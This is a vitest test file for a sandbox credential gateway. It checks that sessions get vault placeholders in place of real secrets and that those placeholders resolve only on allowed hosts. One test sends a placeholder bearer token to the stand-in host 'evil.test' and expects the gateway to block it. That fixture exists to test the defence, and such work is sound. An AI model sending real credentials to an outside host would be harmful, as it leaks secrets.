import { describe, expect, it } from "vitest";
import { builtinSpecs, createSpecRegistry } from "@open-managed-agents/cap";
import type { CredentialStore, StoredCredential } from "@open-managed-agents/credential-store";
import type { CredentialAuth } from "@open-managed-agents/domain/credentials";
import { createVaultPlaceholders } from "@open-managed-agents/sandbox-gateway/vault-substitution";
import { ManagedCredentialResolver, createCredentialEgressCore } from "../src/index";

// Vault sandbox credentials as compiled into the sandbox and the gateway
// (design §0.7 "Vault 占位符替换"; research/sandbox-sdk-v2-design.md:423,
// 8.4 rules 1-3 at :787-789). Values here are test fixtures.
const at = "2026-11-01T00:00:00.000Z";
const record = (id: string, auth: CredentialAuth): StoredCredential => ({
  revision: 1,
  credential: { id, vaultId: "vlt_1", archivedAt: null, createdAt: at, updatedAt: at, metadata: {}, auth },
});
const envVar = record("cred_env", {
  type: "environment_variable", secretName: "API_TOKEN", secretValue: "env-secret-value",
  networking: { type: "limited", allowedHosts: ["api.example.com"] }, injectionLocation: { header: true, body: false },
});
const gh = record("cred_gh", { type: "cap_cli", cliId: "gh", token: "gh-real-token" });

function resolver(records: StoredCredential[], withPlaceholders = true) {
  const credentials = { list: async ({ vaultId }: { vaultId: string }) => records.filter((r) => r.credential.vaultId === vaultId) } as unknown as CredentialStore;
  return new ManagedCredentialResolver({
    vaults: { find: async () => ({ vault: { archivedAt: null } }) }, credentials,
    fetch, clock: { now: () => new Date(at) }, log: { warn() {} },
    ...(withPlaceholders ? { placeholders: createVaultPlaceholders("vault-substitution-test-secret") } : {}),
  }, createSpecRegistry(builtinSpecs));
}
const scope = { workspaceId: "ws", sessionId: "sess", vaultIds: ["vlt_1"] };
const PLACEHOLDER = /^oma_vault_[A-Za-z0-9_-]{43}$/u;

function core(records: StoredCredential[], respond: (request: Request) => Response = () => new Response("ok")) {
  const sent: Request[] = [];
  const warnings: Record<string, unknown>[] = [];
  return { sent, warnings, core: createCredentialEgressCore({
    credentials: resolver(records), send: async (request) => { sent.push(request); return respond(request); },
    log: { warn: (fields) => warnings.push(fields) },
  }) };
}

describe("Vault sandbox credentials", () => {
  it("writes per-Session placeholders for cap_cli and environment_variable, never values", async () => {
    const env = await resolver([envVar, gh]).placeholderEnvironment(scope);
    expect(Object.keys(env).sort()).toEqual(["API_TOKEN", "GITHUB_TOKEN"]);
    expect(env.API_TOKEN).toMatch(PLACEHOLDER);
    expect(env.GITHUB_TOKEN).toMatch(PLACEHOLDER);
    expect(JSON.stringify(env)).not.toMatch(/env-secret-value|gh-real-token|__cap_managed__/u);
    expect(await resolver([envVar, gh]).placeholderEnvironment(scope)).toEqual(env);
    expect((await resolver([envVar]).placeholderEnvironment({ ...scope, sessionId: "other" })).API_TOKEN).not.toBe(env.API_TOKEN);
    await expect(resolver([envVar], false).placeholderEnvironment(scope)).rejects.toThrow(/PLATFORM_ROOT_SECRET/u);
  });

  it("substitutes an environment_variable placeholder only on its allowed host", async () => {
    const { API_TOKEN: placeholder } = await resolver([envVar]).placeholderEnvironment(scope);
    const f = core([envVar], () => new Response("ok", { headers: { "x-echo": "env-secret-value" } }));
    expect(await (await f.core.resolve(scope, "https://api.example.com/v1")).json()).toEqual({ inject: true });
    const response = await f.core.forward(scope, { target: "https://api.example.com/v1", method: "GET",
      headers: new Headers({ authorization: `Bearer ${placeholder}`, "x-api-key": placeholder!, cookie: "ambient" }), body: null });
    expect(response.status).toBe(200);
    expect(response.headers.get("x-echo")).toBe(placeholder);
    expect(f.sent[0]!.headers.get("authorization")).toBe("Bearer env-secret-value");
    expect(f.sent[0]!.headers.get("x-api-key")).toBe("env-secret-value");
    expect(f.sent[0]!.headers.has("cookie")).toBe(false);

    expect(await (await f.core.resolve(scope, "https://evil.test/")).json()).toEqual({ inject: false });
    const offHost = await f.core.forward(scope, { target: "https://evil.test/", method: "GET", headers: new Headers({ authorization: `Bearer ${placeholder}` }), body: null });
    expect(offHost.status).toBe(403);
    expect(f.warnings).toEqual([expect.objectContaining({ rule: "credential_host_mismatch", host: "evil.test", session_id: "sess" })]);
    expect(f.sent).toHaveLength(1);
  });

  it("injects cap_cli by spec host and refuses another credential's placeholder there", async () => {
    const env = await resolver([envVar, gh]).placeholderEnvironment(scope);
    const f = core([envVar, gh]);
    expect(await (await f.core.resolve(scope, "https://api.github.com/user")).json()).toEqual({ inject: true });
    const response = await f.core.forward(scope, { target: "https://api.github.com/user", method: "GET", headers: new Headers({ authorization: `Bearer ${env.GITHUB_TOKEN}` }), body: null });
    expect(response.status).toBe(200);
    expect(f.sent[0]!.headers.get("authorization")).toBe("Bearer gh-real-token");
    const foreign = await f.core.forward(scope, { target: "https://api.github.com/user", method: "GET", headers: new Headers({ "x-api-key": env.API_TOKEN! }), body: null });
    expect(foreign.status).toBe(403);
    expect(await foreign.text()).toBe("Credential relay request denied: credential_host_mismatch");
    expect(f.sent).toHaveLength(1);
  });
});
